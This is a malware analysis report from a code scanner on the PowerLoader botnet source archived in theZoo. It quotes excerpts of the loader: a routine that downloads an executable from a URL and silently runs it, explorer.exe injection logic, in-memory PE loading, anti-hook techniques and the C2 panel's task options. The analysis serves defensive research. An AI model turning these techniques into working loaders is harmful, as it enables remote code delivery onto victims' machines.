# CodeScan Security Report

**Target:** https://github.com/ytisf/theZoo/tree/master/malware/Source/Original/PowerLoader  
**Scan Date:** 2026-03-22  
**Scanner:** CodeScan v1.0.0  

---

## Executive Summary

**Overall Verdict: CRITICAL — CONFIRMED MALWARE. DO NOT INSTALL OR EXECUTE.**

This is the complete source code and C2 infrastructure for **PowerLoader**, a professional-grade Windows botnet loader with a PHP-based command-and-control panel. The codebase is archived in theZoo, a research repository for malware samples. It is not safe to run, build, or deploy outside of a fully isolated research environment.

The scan confirmed five distinct CRITICAL threat categories: an embedded PE dropper for both x86 and x64 Windows, a custom in-memory PE loader for fileless injection, full C2 communication with download-and-execute commands, a web-based botnet administration panel with MySQL backend, and an active self-protection/persistence mechanism.

**OSV Scanner also found a CRITICAL CVE (CVSS 9.8) in theZoo repository's own Python dependency (`pyminizip`).**

---

## Scan Statistics

| Metric | Value |
|---|---|
| Files scanned | 15 (repo) + ~500 (extracted zip) |
| Languages | C++, PHP, Python |
| CRITICAL findings | 5 |
| HIGH findings | 2 |
| MEDIUM findings | 0 |
| OSV CVEs found | 1 (CVSS 9.8) |

---

## OSV Scanner — Dependency Vulnerability

### [CRITICAL] CVE-2023-45853 / GHSA-mq29-j5xf-cjwr in `pyminizip`

**Package:** `pyminizip` 0.2.6 (theZoo's Python dependency in `requirements.txt`)  
**CVSS:** 9.8 (Critical)  
**Fix:** No patched version available at time of scan (`last_affected: 0.2.6`)

**Explanation:** A critical vulnerability in the `pyminizip` library used by theZoo to create password-protected zips of its malware samples. Unrelated to PowerLoader itself, but affects anyone running the theZoo tooling.

---

## Malware Analysis Findings

### [CRITICAL] Embedded PE Executables — 32-bit and 64-bit Dropper Payloads

**Files:** `power_ldr_SRC/binhex/Release/sdropper32-hex.h`, `sdropper64-hex.h`  
**Evidence:**
```c
unsigned char data[] = {
    0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00,  // MZ header — PE executable
    ...
};
```
**Explanation:** Both files contain complete PE executables (Windows `.exe` files) hardcoded as hex byte arrays, confirmed by the `0x4d 0x5a` ("MZ") DOS header magic at offset 0. These are the 32-bit (1,752 lines) and 64-bit (2,051 lines) dropper payloads that are compiled directly into the loader binary and deployed to victim machines without touching disk.

---

### [CRITICAL] Custom In-Memory PE Loader — Fileless Injection

**File:** `power_ldr_SRC/share/peldr.cpp`  
**Evidence:**
```cpp
PIMAGE_NT_HEADERS PeLdr::PeImageNtHeader(PVOID ImageBase) { ... }
PIMAGE_SECTION_HEADER PeLdr::PeSearchSection(PVOID ImageBase, PCHAR SectionName) { ... }
PVOID PeLdr::PeImageDirectoryEntryToData(PVOID ImageBase, BOOLEAN ImageLoaded, ...) { ... }
```
**Explanation:** A fully custom Windows PE loader that manually parses PE headers, resolves import tables, applies relocations, and maps the embedded dropper payloads into memory without using `LoadLibrary` or writing to disk. This is a classic fileless injection technique designed to evade antivirus tools that monitor disk writes and API calls.

---

### [CRITICAL] Download-and-Execute C2 Commands

**File:** `power_ldr_SRC/sdropper/server.cpp`  
**Evidence:**
```cpp
BOOLEAN DownloadRunExeUrl(DWORD TaskId, PCHAR FileUrl) {
    URLDownloadToFile(NULL, FileUrl, chTempName, 0, NULL);
    WinExec(chTempName, 0);
    Server::SendServerAnswer(TaskId, g_CurrentServerUrl, 1, 0);
}

BOOLEAN WriteFileAndExecute(PVOID File, DWORD Size) {
    Utils::FileWrite(chTempName, CREATE_ALWAYS, File, Size);
    WinExec(chTempName, 0);
}
```
**Explanation:** The C2 server can push tasks to infected bots commanding them to download an executable from a URL and run it silently (`WinExec(..., 0)` hides the window). A second variant receives the binary blob directly from the C2 server and writes+executes it. Both report success back to the C2 panel. This is the core mechanism for delivering second-stage payloads to all infected machines simultaneously.

---

### [CRITICAL] PHP Botnet C2 Administration Panel

**Files:** `power_ldr_eng_ADMIN/index.php`, `act/tasks.php`, `act/stats.php`, `act/files.php`  
**Evidence (tasks.php):**
```html
<option value='DownloadRunExeUrl'>Download and execute EXE</option>
<option value='DownloadRunExeId'>Download from server and execute EXE</option>
<option value='DownloadUpdateMain'>Download and update loader EXE</option>
<option value='WriteConfigString'>Write to the config</option>
```
**Explanation:** A complete PHP/MySQL web application for operating the botnet. The operator can: issue download-and-execute commands to any or all bots; filter tasks by country using GeoIP data; track per-bot "clean/dirty" status (i.e. whether the machine has executed a task); monitor task execution counts (started/finished/failed); and push self-update payloads to replace the loader on infected machines. Written in Russian.

---

### [CRITICAL] Process Injection into explorer.exe + Persistence

**File:** `power_ldr_SRC/sdropper/dropper.cpp`  
**Evidence:**
```cpp
if (!lstrcmpi(CurrentProcess, "explorer.exe") &&
    Utils::CreateCheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid())) {
    Protect::StartProtect();
    Utils::ThreadCreate(Server::ServerLoopThread, NULL, NULL);
}
```
**Explanation:** The loader specifically targets `explorer.exe` as its injection host — a persistent Windows shell process that is always running and trusted by the OS. Once injected, it starts a protection thread and a C2 communication loop. The machine GUID is read from `HKLM\Software\Microsoft\Cryptography\MachineGuid` to uniquely identify the bot to the C2 server. The `protect.cpp` self-update mechanism watches for C2-pushed updates and replaces the loader executable, surviving reboots.

---

### [HIGH] Cyrillic Source Comments — Indicates Origin

**Files:** `dropper.cpp` and others  
**Evidence:**
```
// ищем процессы с тем самым именем как и этот файл если нет то ищем в папке у системы
```
*(Translation: "looking for processes with the same name as this file, if not found then look in the system folder")*  
**Explanation:** Developer comments throughout the source are written in Russian, consistent with Eastern European cybercrime tooling of the era (PowerLoader was active circa 2012–2013).

---

### [HIGH] HDE Disassembler Engine — Anti-Hook / Code Patching

**Files:** `power_ldr_SRC/share/hde32/`, `hde64/`  
**Explanation:** The Hacker Disassembler Engine (HDE) is included for runtime disassembly of Windows API functions. This is used by malware to detect and remove inline hooks placed by AV/EDR products, or to patch function prologues for API hooking itself — a known technique for bypassing security software monitoring.

---

## Recommendation

**DO NOT BUILD, DEPLOY, OR EXECUTE ANY PART OF THIS CODE.**

This is fully functional, production-grade botnet source code. The C2 panel is deployable as-is. The dropper payloads are pre-compiled and embedded. If you are studying this for research, ensure you are working in a fully air-gapped VM with no network access and snapshots enabled.

The theZoo repository is a legitimate malware research archive and this result is expected — the scanner worked correctly.

---

*Report generated by CodeScan v1.0.0. All analysis was performed inside a disposable Docker sandbox. The Docker volume and all extracted malware content has been destroyed.*
